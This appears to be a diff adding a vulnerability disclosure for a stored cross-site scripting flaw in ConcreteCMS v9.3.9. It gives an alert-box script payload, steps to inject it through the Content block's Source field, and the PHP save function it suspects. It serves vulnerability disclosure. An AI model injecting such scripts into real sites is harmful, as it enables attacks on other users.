@@ -1,0 +1,30 @@
+# Exploit Title: Concretecms v9.3.9 - Cross-Site Scripting (XSS)
+## Date: 3/13/2025
+## Vendor Homepage: https://github.com/concretecms/concretecms
+## Tested on: Debian Linux, Apache, Mysql
+## Vendor: Concretecms
+## Version: v9.3.9
+## Exploit Description:
+## ConcreteCMS v9.3.9 suffers from a Stored Cross-Site Scripting (XSS) vulnerability in the Source text field when adding a Content block. This vulnerability allows attackers to cheat other users by injecting malicious scripts into web pages viewed by other users.
+
+## ---------------------------------POC-----------------------------
+
+```
+<script>alert('source');</script>
+```
+
+1. Log in as a user with page editing privileges.
+2. Click "add content to the page" in the top navigation.
+3. Select the Content block , drag and drop it to the page.
+4. Add <script>alert('...');</script> to the Source text field and then click OK,the xss vulnerability appears.
+
+Potentially problematic source code:
+```php
+public function save($args)
+    {
+        if (isset($args['content'])) {
+            $args['content'] = LinkAbstractor::translateTo($args['content']);
+        }
+        parent::save($args);
+    }
+```
